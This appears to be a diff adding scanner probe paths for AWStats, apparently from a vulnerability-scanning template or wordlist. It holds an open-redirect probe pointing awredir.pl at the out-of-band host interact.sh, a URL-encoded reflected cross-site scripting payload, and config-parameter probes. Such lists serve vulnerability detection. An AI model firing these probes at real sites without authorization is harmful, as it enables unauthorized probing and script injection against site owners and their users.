@@ -1,0 +1,7 @@
+/awstats/awredir.pl?url=interact.sh
+/cgi-bin/awstats/awredir.pl?url=interact.sh
+/awstats/awredir.pl?url=%3Cscript%3Ealert(document.domain)%3C/script%3E
+/cgi-bin/awstats/awredir.pl?url=%3Cscript%3Ealert(document.domain)%3C/script%3E
+/cgi-bin/awstats.pl?config={{randstr}}
+/awstats/awstats.pl?config={{randstr}}
+/awstats.pl?config={{randstr}}
